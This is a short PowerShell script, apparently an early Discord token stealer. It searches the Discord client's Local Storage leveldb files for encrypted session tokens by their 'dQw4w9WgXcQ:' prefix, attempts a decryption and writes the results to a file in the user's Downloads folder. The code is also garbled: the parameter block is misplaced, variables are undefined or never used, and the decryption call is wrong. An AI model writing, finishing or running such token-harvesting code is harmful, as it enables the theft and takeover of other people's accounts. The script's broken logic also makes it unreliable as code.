function gettoken {
$discordPath = $env:APPDATA+"\discord"
$storagePath = "\Local Storage\leveldb"

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$True)]
    [string]$decryptkey
)

$stable = $discordPath+$storagePath
if ( Test-Path -LiteralPath $stable ) {
  Set-Location $stable
  $files = @(Get-ChildItem *.ldb)
  Foreach ($file in $files) {
    $file = Get-Content -Path $file
    $rickrolllink = "dQw4w9WgXcQ:"
    $endofdctoken = '=="'
    $pattern = "$rickrolllink(.*?)$endofdctoken"
    $result = [regex]::Match($file,$pattern).Groups[1].Value
    $decryptkey="e"
    $decrypted = ConvertFrom-SecureString $stringSecure -Key $decryptkey
    }
}
}

gettoken > "C:\Users\$env:username\Downloads\cumcum.txt" 
